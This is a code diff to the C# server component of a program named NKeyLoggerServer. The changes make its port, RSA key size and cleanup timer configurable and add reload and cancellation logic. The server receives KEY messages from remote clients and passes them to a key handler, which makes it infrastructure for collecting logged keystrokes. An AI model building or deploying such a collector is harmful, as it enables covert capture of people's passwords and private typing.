@@ -15,20 +15,57 @@ using static NKeyLoggerServer.Server;
 namespace NKeyLoggerServer;
 internal class Server : IDisposable
 {
-    private IPEndPoint ipPoint { get; set; } = new IPEndPoint(IPAddress.Any, 56535);
-    private readonly Network network = new Network();
-    private readonly RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(0x1000);
+    private IPEndPoint ipPoint { get; set; }
+    private Network network;
+    private RSACryptoServiceProvider rsa;
     private bool isStart = false;
     private ConcurrentDictionary<Network, Task> connections = new ConcurrentDictionary<Network, Task>();
-    private const int clearConnctionElipse = 0xFFFE;
-    private System.Timers.Timer checkClearConnectionTimer = new System.Timers.Timer(clearConnctionElipse);
-    public Server()
+    private System.Timers.Timer checkClearConnectionTimer { get; set; }
+    private AbstractSetting setting { get; set; }
+    private CancellationTokenSource cancalableSource { get; set; }
+    public Server(AbstractSetting setting)
     {
+        this.setting = setting;
+        checkSetting(setting);
+        setting.onChangeFile += new AbstractSetting.ChangeSettingFilePath(changeFileSetting);
+        this.setting = setting;
         init();
     }
 
+    private void checkSetting(AbstractSetting setting)
+    {
+        int port = int.Parse(setting.Properties["port"]);
+        if(port <=0 || port >= 0xFFFF)
+            throw new ApplicationException("Error parse settings: invalid port");
+        int cryptoKeySize = int.Parse(setting.Properties["cryptokeysize"]);
+        if (cryptoKeySize <= 0x400)
+            throw new ApplicationException("Error parse settings: crypto key size should be more 1024");
+        int clearConnectionelipse = int.Parse(setting.Properties["clearconnectionelipse"]);
+    }
+
+    private void changeFileSetting(AbstractSetting setting)
+    {
+        reload();
+    }
+
+    public void reload()
+    {
+        if (isStart == false)
+            return;
+        this.Dispose();
+        checkSetting(this.setting);
+        init();
+        var newTask = start();
+        updateTask?.Invoke(newTask);
+    }
     private void init()
     {
+        this.network = new Network();
+        ipPoint = new IPEndPoint(IPAddress.Any, int.Parse(this.setting.Properties["port"]));
+        rsa = new RSACryptoServiceProvider(int.Parse(this.setting.Properties["cryptokeysize"]));
+        checkClearConnectionTimer = new System.Timers.Timer(int.Parse(this.setting.Properties["clearconnectionelipse"]));
+        cancalableSource = new CancellationTokenSource();
+
         network.socket.Bind(ipPoint);
         network.socket.Listen();
         checkClearConnectionTimer.Elapsed += (sender, e) =>
@@ -46,7 +83,6 @@ internal class Server : IDisposable
             });
         checkClearConnectionTimer.Start();
     }
-
     public async Task start()
     {
         if (isStart)
@@ -56,17 +92,17 @@ internal class Server : IDisposable
 
         while (isStart)
         {
-            var socket = await network.socket.AcceptAsync();
+            var socket = await network.socket.AcceptAsync(cancalableSource.Token);
             Network clientNet = new Network(socket);
             var connectionTask = Task.Factory.StartNew( async () => {
                 try
                 {
-                    await clientNet.send(rsa.ExportRSAPublicKey(), Network.Type.CRYPTOKEY);
+                    await clientNet.sendAsync(rsa.ExportRSAPublicKey(), Network.Type.CRYPTOKEY);
                     await read(clientNet);
                 } catch (SocketException)
                 {
                     //TODO
-                }catch (Exception ex)
+                }catch (Exception)
                 {
                     //TODO
                 }
@@ -85,6 +121,7 @@ internal class Server : IDisposable
         var taskList = connections.Values;
         Task.WaitAll(taskList);
         connections.Clear();
+        cancalableSource.Cancel();
     }
 
     private void stop(Network socketSuppler)
@@ -100,7 +137,7 @@ internal class Server : IDisposable
                 throw new ArgumentNullException("Network is null");
             while (isStart)
             {
-                var result = await clientNet.recv();
+                var result = await clientNet.recvAsync();
                 switch (result.type)
                 {
                     case Network.Type.KEY: TakeKey(result.data, clientNet); break;
@@ -137,7 +174,12 @@ internal class Server : IDisposable
         stop();
         network.Dispose();
         rsa.Dispose();
+        this.checkClearConnectionTimer.Dispose();
+        this.cancalableSource.Dispose();
     }
+
+    public delegate void updateStartTask(Task task);
+    public event updateStartTask? updateTask;
 
     public event KeyHandler? keyHandler;
     public delegate void KeyHandler(Server sender, Network clientNet, AbstractKeyInfo keyInfo);
